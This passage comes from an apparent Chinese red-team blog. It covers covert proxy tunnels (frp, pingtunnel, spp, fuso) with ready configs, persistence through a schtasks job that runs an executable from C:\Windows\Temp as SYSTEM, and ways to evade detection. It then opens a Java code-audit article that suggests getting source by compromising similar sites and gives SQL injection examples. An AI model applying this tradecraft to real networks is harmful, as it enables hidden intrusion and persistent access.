10.251.251.128</span><br><span class="line">local_port &#x3D; 6001</span><br><span class="line">remote_port &#x3D; 6001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">客户端3:</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 10.251.251.128</span><br><span class="line">server_port &#x3D; 8118</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5-test3]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6001</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; admin</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#创建名为“frp”每天<span class="number">9</span>点执行frpc的计划任务</span><br><span class="line">schtasks  /create  /tn  frp /tr  &quot;D:\frpc.exe -c frpc.ini&quot;  /sc  DAILY /st  <span class="number">09</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">#删除名为“frp”的计划任务</span><br><span class="line">SCHTASKS /Delete /TN &quot;frp&quot; /f</span><br><span class="line">#查询名为“frp”的计划任务</span><br><span class="line">SCHTASKS /Query /TN frp</span><br><span class="line">SCHTASKS /Delete /TN &quot;\Microsoft\Windows\<span class="number">360</span>\update&quot;</span><br><span class="line">SCHTASKS /Create /RU SYSTEM /sc minute /mo <span class="number">1</span> /tr &quot;c:\Windows\Temp\fpc-wss-domain.exe -c c:\Windows\Temp\frc.txt&quot;</span><br></pre></td></tr></table></figure><h4 id="frp过cdn"><a href="#frp过cdn" class="headerlink" title="frp过cdn"></a>frp过cdn</h4><p><a href="https://github.com/uknowsec/frpModify">https://github.com/uknowsec/frpModify</a></p><p>frps.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip &#x3D; 10.251.251.129</span><br><span class="line">bind_port &#x3D; 8880</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_only &#x3D; true</span><br><span class="line">protocol &#x3D; websocket</span><br></pre></td></tr></table></figure><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; domain</span><br><span class="line">server_port &#x3D; 8880</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">protocol &#x3D; websocket</span><br><span class="line"></span><br><span class="line">[plugin_socks5-test]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6001</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; admin</span><br></pre></td></tr></table></figure><h4 id="frp过http代理"><a href="#frp过http代理" class="headerlink" title="frp过http代理"></a>frp过http代理</h4><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 10.251.251.129</span><br><span class="line">server_port &#x3D; 8880</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">http_proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:8080</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5-test]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6001</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; admin</span><br></pre></td></tr></table></figure><h3 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h3><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p><p>端口转发</p><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;pingtunnel -type server -key 457832424864</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all</span><br></pre></td></tr></table></figure><h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type client -l :4455 -s x.x.x.x -t x.x.x.x:8888 -tcp 1 -noprint 1 -nolog 1 -key 457832424864</span><br></pre></td></tr></table></figure><p>注：客户端监听本地的4455 端口，指定服务端IP为47.x.x.x，然后将本地端口4455 的流量转发</p><p><strong>frp + pingtunnel 搭建隧道</strong></p><p>frp的server选127.0.0.1:4455即可，其他不变</p><h3 id="icmp-spp"><a href="#icmp-spp" class="headerlink" title="icmp-spp"></a>icmp-spp</h3><p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p><p>spp是一个简单强大的网络代理工具。</p><p><img src="/images/image-20220902212752451.png" alt="image-20220902212752451"></p><ul><li>支持的协议：tcp、udp、rudp(可靠udp)、ricmp(可靠icmp)、rhttp(可靠http)、kcp、quic</li><li>支持的类型：正向代理、反向代理、socks5正向代理、socks5反向代理</li><li>协议和类型可以自由组合</li><li>外部代理协议和内部转发协议可以自由组合</li><li>支持shadowsocks插件，<a href="https://github.com/esrrhs/spp-shadowsocks-plugin">spp-shadowsocks-plugin</a>，<a href="https://github.com/esrrhs/spp-shadowsocks-plugin-android">spp-shadowsocks-plugin-android</a></li></ul><h4 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h4><ul><li>在vps的8888端口开启tcp流量监听</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;spp -type server -proto tcp -listen :8888</span><br></pre></td></tr></table></figure><p>通过修改-proto参数可以自主选择监听流量协议类型<br>这里需要注意，ricmp协议无需设置端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;spp -type server -proto ricmp -listen 0.0.0.0</span><br></pre></td></tr></table></figure><ul><li>可以使用一条命令在不同端口监听不同协议</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;spp -type server -proto tcp -listen :8888 -proto rudp -listen :9999 -proto ricmp -listen 0.0.0.0</span><br></pre></td></tr></table></figure><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><ul><li>将vps的8999端口代理至本机8080</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;spp -name &quot;test&quot; -type proxy_client -server vps:8888 -fromaddr :8080 -toaddr :8999 -proxyproto tcp</span><br></pre></td></tr></table></figure><ul><li>将本机器80端口代理至vps的8998端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;spp -name &quot;test&quot; -type reverse_proxy_client -server vps:8888 -fromaddr :8998 -toaddr :80 -proxyproto tcp</span><br></pre></td></tr></table></figure><ul><li>启动tcp正向socks5代理，在本地8080端口开启socks5协议，代理至server网络环境下</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;spp -name &quot;test&quot; -type socks5_client -server vps:8888 -fromaddr :8080 -proxyproto tcp</span><br></pre></td></tr></table></figure><p>挂代理 socks5:127.0.0.1:8080</p><ul><li>启动tcp反向socks5代理，代理至client网络环境下</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;spp -name &quot;test&quot; -type reverse_socks5_client -server vps:8888 -fromaddr :8080 -proxyproto tcp</span><br></pre></td></tr></table></figure><p>挂代理 socks5:vps:8080</p><ul><li>其他代理协议，只需要修改client的proxyproto参数即可，例如</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">代理udp</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto udp</span><br><span class="line"></span><br><span class="line">代理rudp</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8081 -toaddr :8081 -proxyproto rudp</span><br><span class="line"></span><br><span class="line">代理ricmp</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8082 -toaddr :8082 -proxyproto ricmp</span><br><span class="line"></span><br><span class="line">同时代理上述三种</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto udp -fromaddr :8081 -toaddr :8081 -proxyproto rudp -fromaddr :8082 -toaddr :8082 -proxyproto ricmp</span><br></pre></td></tr></table></figure><ul><li>client和server之间的内部通信，也可以修改为其他协议，外部协议与内部协议之间自动转换。例如</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">代理tcp，内部用rudp协议转发</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto tcp -proto rudp</span><br><span class="line"></span><br><span class="line">代理tcp，内部用ricmp协议转发</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com -fromaddr :8080 -toaddr :8080 -proxyproto tcp -proto ricmp</span><br><span class="line"></span><br><span class="line">代理udp，内部用tcp协议转发</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto udp -proto tcp</span><br><span class="line"></span><br><span class="line">代理udp，内部用kcp协议转发</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto udp -proto kcp</span><br><span class="line"></span><br><span class="line">代理tcp，内部用quic协议转发</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto tcp -proto quic</span><br><span class="line"></span><br><span class="line">代理tcp，内部用rhttp协议转发</span><br><span class="line"># .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto tcp -proto rhttp</span><br></pre></td></tr></table></figure><ul><li>也可以使用docker</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># docker run --name my-client -d --restart&#x3D;always --network host esrrhs&#x2F;spp .&#x2F;spp -name &quot;test&quot; -type proxy_client -server www.server.com:8888 -fromaddr :8080 -toaddr :8080 -proxyproto tcp</span><br></pre></td></tr></table></figure><h3 id="Fuso"><a href="#Fuso" class="headerlink" title="Fuso"></a>Fuso</h3><p>扶桑</p><p>一款 快速🚀 稳定 跨平台 高效的内网穿透，端口转发工具，Rust编写</p><p><a href="https://github.com/editso/fuso">https://github.com/editso/fuso</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1. 端口转发</span><br><span class="line">fuc --forward-host xxx.xxx.xxx.xxx --forward-port</span><br><span class="line">   --forward-host: 转发到的地址</span><br><span class="line">   --forward-port: 转发到的端口</span><br><span class="line">   如: 转发流量到内网 10.10.10.4:3389</span><br><span class="line">   &gt; fuc --forward-host 10.10.10.4 --forward-port 3389</span><br><span class="line"></span><br><span class="line">2. socks5:</span><br><span class="line">fuc --socks --su --s5p xxx --s5u xxx</span><br><span class="line">   --su: 可选的, 开启udp转发, </span><br><span class="line">   --s5p: 可选的, 认证密码, 默认不进行密码认证</span><br><span class="line">   --s5u 可选的, 认证账号, 默认账号 anonymous</span><br><span class="line">   --socks: 可选的, 开启socks5代理, 未指定--su的情况下不会转发udp</span><br><span class="line">   如: 开启udp转发与密码认证</span><br><span class="line">   &gt; fuc --socks --su --s5p 123 --s5u socks</span><br><span class="line">   此时, 已开启udp转发,连接密码为 &quot;123&quot;,账号为 &quot;socks&quot;</span><br><span class="line"></span><br><span class="line">3. 指定穿透成功时访问的端口</span><br><span class="line">   fuc -b xxxx</span><br><span class="line">   -b | --visit-bind-port: 可选的, 默认随机分配</span><br><span class="line">   如: 访问外网端口 8888 转发到内网 80</span><br><span class="line">   &gt; fuc --forward-port 80 -b 8888</span><br><span class="line">   </span><br><span class="line">4. 桥接模式 注意: 目前不能转发udp</span><br><span class="line">   fuc --bridge-listen xxxx --bridge-port xxx </span><br><span class="line">   --bridge-listen | --bl: 监听地址, 默认 127.0.0.1</span><br><span class="line">   --bridge-port | --bp: 监听端口, 默认不启用桥接</span><br><span class="line">   如: 开始桥接模式,并监听在9999端口, 本机ip地址为: 10.10.10.2</span><br><span class="line">   &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 开启桥接</span><br><span class="line">   &gt; fuc 10.10.10.2 9999 # 建立连接</span><br><span class="line"></span><br><span class="line">   级联: </span><br><span class="line">   &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 第一级, IP: 10.10.10.2</span><br><span class="line">    &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9991  10.10.10.2 9999 # 第二级, IP: 10.10.10.3</span><br><span class="line">     &gt; fuc 10.10.10.3 9991 # 最终 </span><br><span class="line"></span><br><span class="line">5. 将连接信息通知到 Telegram 或其他</span><br><span class="line">   fus --observer &quot;program:[arguments]&quot;</span><br><span class="line">   --observer: 建立连接或断开连接时的钩子</span><br><span class="line">   如: 使用bash脚本将连接信息通知到tg</span><br><span class="line">   &gt; fus --observer &quot;&#x2F;bin&#x2F;bash:[telegram.sh]&quot;</span><br><span class="line"></span><br><span class="line">6. 指定客户端与服务端通信的端口</span><br><span class="line">   fuc --channel-port 8888 ...</span><br><span class="line">   --channel-port: 可选的, 客户端与服务端通信端口, 默认随机</span><br></pre></td></tr></table></figure><p><img src="/images/fuso.gif" alt="fuso"></p><p>在10.251.251.128的30000上开启socks5代理，用户名为admin，密码为admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuc.exe 8.134.103.4 6722 --socks --su --s5p admin --s5u admin -b 30000 </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fuc.exe 8.134.103.4 6722 --socks --su --s5p admin --s5u admin -b 30000 --bridge-listen 0.0.0.0 --bridge-port 9999 #在10.251.251.128</span><br><span class="line"></span><br><span class="line">fuc --bridge-listen 0.0.0.0 --bridge-port 9991  10.251.251.128 9999    #在10.251.251.129</span><br><span class="line"></span><br><span class="line">fuc 10.251.251.128 9991 --socks --su --s5p admin --s5u admin -b 30000  #10.251.251.129</span><br></pre></td></tr></table></figure><h2 id="免杀隐匿"><a href="#免杀隐匿" class="headerlink" title="免杀隐匿"></a>免杀隐匿</h2><p>对于代理的免杀隐匿，主要就以下几个方面，以frp举例</p><h3 id="工具本身特征"><a href="#工具本身特征" class="headerlink" title="工具本身特征"></a>工具本身特征</h3><p>对于frp来说，工具本身的特征来源其<code>fatedier/frp</code>关键字，以及开源生成的md5文件特征，这里可批量替换特征值，同时可以将源码进行随机混淆和重新编译即可。</p><h3 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h3><p>frp 建立 TLS 连接的第一个字节为 0x17</p><ul><li>非TLS特征明显</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.ini 加入tls_enable &#x3D; true</span><br></pre></td></tr></table></figure><p>从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 frpc.ini 的 common 中配置 tlsenable = true 来启用此功能，安全性更高。为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。通过将 frps.ini 的 [common] 中 tlsonly 设置为 true，可以强制 frps 只接受 TLS 连接。</p><ul><li>tls特征改造，<a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649740618&idx=1&sn=f1d67aaeab34a0329c5b648c7982c143">第一个字节为0x17</a></li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>配置文件留在客户端不安全，且麻烦，也难以部署等等</p><p>通常来说我们的跳板机都是默认可以访问到我们部署的服务端的,所以可以采取远程加载配置或者直接在客户端中写入配置文件的方式来避免文件落地（Linux下虽可以看远程地址，但是可以搞一个临时的域名或ip）</p><h3 id="远程服务器特征"><a href="#远程服务器特征" class="headerlink" title="远程服务器特征"></a>远程服务器特征</h3><p>可采用CDN和云函数的方式进行上线，从而保护达到隐藏服务器ip和</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a><br><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a><br><a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a><br><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a><br><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a><br><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a><br><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br><a href="https://github.com/editso/fuso">https://github.com/editso/fuso</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 代理隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队-java代码审计生命周期</title>
      <link href="2022/12/19/%E7%BA%A2%E9%98%9Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
      <url>2022/12/19/%E7%BA%A2%E9%98%9Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="红队-java代码审计生命周期"><a href="#红队-java代码审计生命周期" class="headerlink" title="红队-java代码审计生命周期"></a>红队-java代码审计生命周期</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>红队java代码审计生命周期中常见的一些漏洞学习总结以及一些审计思路。</p><h2 id="红队java代码审计生命周期"><a href="#红队java代码审计生命周期" class="headerlink" title="红队java代码审计生命周期"></a>红队java代码审计生命周期</h2><p>源码获取-&gt;审计环境配置-&gt;代码审计-&gt;poc&amp;exp编写-&gt;后渗透利用-&gt;相关文档输出</p><p><img src="/images/image-20221111160018658.png" alt="image-20221111160018658"></p><h2 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h2><ul><li>开源、二开（官网、github、码云）</li><li>相似站点批量扫备份文件</li><li>相似站点getshell打包</li><li>网盘搜索</li><li>咸鱼、淘宝、TG</li><li>云市场</li><li>……</li></ul><h2 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h2><ul><li><p>idea</p></li><li><p>vscode</p></li><li><p>jdk8（按源码支持的）</p></li><li><p>tomcat</p></li><li><p>burp</p></li><li><p>jd-gui</p></li><li><p>…..</p></li></ul><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="快速代码审计"><a href="#快速代码审计" class="headerlink" title="快速代码审计"></a>快速代码审计</h3><ul><li><p>提取源码中的全部jsp，find /domain/ -name “*.jsp”,提取出来后用路径直接去用burp批量跑目录（可换请求的方法，GET、POST），把返回200(根据网站情况)的路径提取出来，表示可以直接未认证访问；然后在跟进这些jsp代码，通过查找相关的sink函数，在去定位source是否可控，如果可控那么就形成一条污染链，在看是否需要绕过sanitizer。</p></li><li><p>通过提取web.xml里面的servlet-name路径，然后拼接路径直接去用burp批量跑目录（可换请求的方法，GET、POST），把返回200(根据网站情况)的路径提取出来，表示可以直接未认证访问，然后根据对应的servlet-name的servlet-class根据相关联的class代码（用idea可直接将.class逆向出来，比较完整；有些是引用jar包形式，可通过jd-gui进行逆向或者idea逆向出来源码审计）。同样的通过查找相关的sink函数，在去定位source是否可控，如果可控那么就形成一条污染链，在看是否需要绕过sanitizer。</p></li><li><p>通过批量提取js或者html里面的url接口和path路径。同样方法类似如上。</p></li><li><p>关键的sink函数定位。</p></li></ul><h3 id="SpringBoot项目结构"><a href="#SpringBoot项目结构" class="headerlink" title="SpringBoot项目结构"></a>SpringBoot项目结构</h3><p>一个简单的springboot项目结构如下</p><p><img src="/images/image-5558929.png" alt="image"></p><p>其中Java代码全部放在/src/main/java/目录下，资源文件在/src/main/resources/下</p><h4 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h4><p>common/: 存放通用类，如工具类和通用返回结果<br>config/: 存放配置文件<br>controller/: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。<br>dao/: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口<br>entity/: 存放实体类<br>interceptor/: 拦截器<br>service/: 存放服务类，负责业务模块逻辑处理。Service层中有两种类，一是Service，用来声明接口；二是ServiceImpl，作为实现类实现接口中的方法。<br>utils/: 存放工具类<br>NewBeeMallApplication.java: Spring Boot启动类<br>dto/: 存放数据传输对象（Data Transfer Object），如请求参数和返回结果<br>vo/: 视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全<br>constant/: 存放常量<br>filter/: 存放过滤器<br>component/: 存放组件</p><h4 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h4><p>在src/main/resources下存放资源文件<br>mapper/: 存放Mybaits的mapper.xml文件<br>static/: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问<br>templates/: 存放模版文件<br>application.properties: Spring Boot默认配置文件<br>META-INF/: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务<br>i18n/: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p><h4 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h4><p>⚠️ Spring Boot无需配置 web.xml，但在其他Java项目中，web.xml是一个非常重要的文件，用来配置Servlet、Filter、Listener等。<br>pom.xml: maven的配置文件，记录项目信息、依赖信息、构建配置等<br>如果使用gradle进行自动化构建，则会存在build.gradle文件</p><h3 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h3><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。<br>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。<br>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的DispatcherServlet，DispatcherServlet的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。<br>请求经过Filter和Interceptor之后会被DispatcherServlet分配到对应路径的Controller（控制器），文件名为ExampleController，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。<br>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为ExampleService，用来声明接口；二是接口实现类，文件名为ExampleServiceImpl，作为实现类实现接口中的方法。实现的代码都在ExampleServiceImpl中。当Service涉及到数据库操作时就会调用Dao。<br>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为ExampleMapper.xml，存放在src/main/resources/mapper中。<br>从用户请求到服务器处理的主要过程如下图所示（省略了DispatcherServlet）：<br><img src="/images/image-2-5558974.png" alt="image-2"><br>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。<br><img src="/images/image-3.png" alt="image-3"></p><h4 id="java项目分层"><a href="#java项目分层" class="headerlink" title="java项目分层"></a>java项目分层</h4><ul><li><p>视图层(View 视图)</p></li><li><p>控制层（Controller、Action控制层)</p></li><li><p>服务层(Service)</p></li><li><p>业务逻辑层BO(business object)</p></li><li><p>实体层(entity 实体对象、VO(value)object)值对象、模型层(bean)</p><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4></li><li><p>Servlet是在Java Web容器上运行的小程序</p></li><li><p>Servlet3.0之前的版本都需要在web.xml中配置</p></li><li><p>Spring MVC框架就是基于Servlet技术实现的</p></li></ul><h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><h4 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h4><p>本质是将用户的输入当做代码执行，程序将用户的输入拼接到了sql语句中，改变原来sql语句的语义造成攻击。</p><h4 id="常见的一些例子"><a href="#常见的一些例子" class="headerlink" title="常见的一些例子"></a><strong>常见的一些例子</strong></h4><p>DAO: 存在拼接的SQL语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql=<span class="string">&quot;select * from user where id=&quot;</span>+id</span><br></pre></td></tr></table></figure><p>Hibernate框架</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.createQuery(<span class="string">&quot;from Book where title like &#x27;%&quot;</span> + userInput + <span class="string">&quot;%&#x27; and published = true&quot;</span>)</span><br></pre></td></tr></table></figure><p>Mybatis框架</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 